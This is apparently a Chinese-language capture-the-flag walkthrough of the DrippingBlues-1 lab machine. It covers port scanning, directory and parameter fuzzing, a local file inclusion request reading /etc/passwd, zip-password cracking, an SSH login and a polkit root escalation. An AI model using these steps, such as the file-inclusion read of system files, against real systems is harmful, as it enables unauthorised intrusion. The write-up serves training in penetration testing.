# DrippingBlues-1

## 目录

[TOC]

---

## 主机探测

### nmap扫描

```shell
# nmap -n 192.168.1.1-255

Nmap scan report for 192.168.1.237
Host is up (0.00018s latency).
Not shown: 997 closed tcp ports (reset)
PORT   STATE SERVICE
21/tcp open  ftp
22/tcp open  ssh
80/tcp open  http
MAC Address: 00:0C:29:1B:B4:6D (VMware)
```

扫描发现一台可疑的主机，开放了http服务，访问查看

![image-20230 601132042597](https://raw.githubusercontent.com/Mu-cream/image/master/image-20230601132042597.png)

#### 发现目标

确认是目标机器，IP为 `192.168.1.237`，开放端口服务`21:FTP、22:SSH、80:HTTP`

---

## 信息收集

### 网站目录扫描

```shell
# dirb http://192.168.1.237/
-----------------
DIRB v2.22    
By The Dark Raver
-----------------
START_TIME: Thu Jun  1 03:46:42 2023
URL_BASE: http://192.168.1.237/
WORDLIST_FILES: /usr/share/dirb/wordlists/common.txt
-----------------
GENERATED WORDS: 4612
---- Scanning URL: http://192.168.1.237/ ----
+ http://192.168.1.237/index.php (CODE:200|SIZE:138)
+ http://192.168.1.237/robots.txt (CODE:200|SIZE:78)
+ http://192.168.1.237/server-status (CODE:403|SIZE:278)
-----------------
END_TIME: Thu Jun  1 03:46:45 2023
DOWNLOADED: 4612 - FOUND: 3
```

发现可疑文件`robots.txt`，尝试访问

```html
User-agent: *
Disallow: /dripisreal.txt
Disallow: /etc/dripispowerful.html
```

尝试访问`/dripisreal.txt`

```html
hello dear hacker wannabe,

go for this lyrics:

https://www.azlyrics.com/lyrics/youngthug/constantlyhating.html

count the n words and put them side by side then md5sum it

ie, hellohellohellohello >> md5sum hellohellohellohello

it's the password of ssh
```

给出了一个绝对路径，推测有文件包含漏洞

#### 使用【Ffuf】爆破参数名

```shell
# ffuf -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -u http://192.168.1.237/index.php?FUZZ=/etc/passwd -ic -c -r -fs 138

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v2.0.0-dev
________________________________________________

 :: Method           : GET
 :: URL              : http://192.168.1.237/index.php?FUZZ=/etc/passwd
 :: Wordlist         : FUZZ: /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
 :: Follow redirects : true
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200,204,301,302,307,401,403,405,500
 :: Filter           : Response size: 138
________________________________________________

[Status: 200, Size: 3032, Words: 50, Lines: 58, Duration: 6ms]
    * FUZZ: drip

:: Progress: [220547/220547] :: Job [1/1] :: 4255 req/sec :: Duration: [0:00:53] :: Errors: 0 ::
```

爆破得到参数名`drip`

### 尝试弱/空口令，匿名访问

![image-20230601155107008](https://raw.githubusercontent.com/Mu-cream/image/master/image-20230601155107008.png)

FTP直接访问成功,得到一个加密的zip文件，使用工具暴力破解出密码`072528035`，得到txt内容`just focus on “drip”`，与上面爆破出的参数名对应

---

## 漏洞探测/利用【获得SSH密码】

得知`index.php`参数名为`drip`，结合已知绝对路径`/etc/dripispowerful.html`尝试访问`http://192.168.1.237/index.php?drip=/etc/dripispowerful.html`，得到密码如下

```html
password is:
imdrippinbiatch
```

继续通过文件包含查看`/etc/passwd`查看可用用户名，找到以下内容

```shell
thugger:x:1001:1001:,,,:/home/thugger:/bin/bash
```

ssh远程连接成功

```shell
┌──(root㉿kali)-[/]
└─# ssh thugger@192.168.1.237  
thugger@192.168.1.237's password: 
Welcome to Ubuntu 20.04 LTS (GNU/Linux 5.11.0-34-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

495 updates can be installed immediately.
233 of these updates are security updates.
To see these additional updates run: apt list --upgradable

The list of available updates is more than a week old.
To check for new updates run: sudo apt update
New release '22.04.2 LTS' available.
Run 'do-release-upgrade' to upgrade to it.

Your Hardware Enablement Stack (HWE) is supported until April 2025.
Last login: Thu Jun  1 11:12:27 2023 from 192.168.1.232
thugger@drippingblues:~$ 

```

---

## 提权

查看系统进程，发现权限审核工具`polkit`

```shell
thugger@drippingblues:~$ ps -aux |grep root
root         711  0.0  0.2 239116 11752 ?        Ssl  07:43   0:00 /usr/lib/policykit-1/polkitd --no-debug
```

在Github上搜索`polkit exploit`，找到pwn脚本，运行后成功提权至root

`flag:78CE377EF7F10FF0EDCA63DD60EE63B8`

---

## 总结

- 拿到ftp，别犹豫，试试它

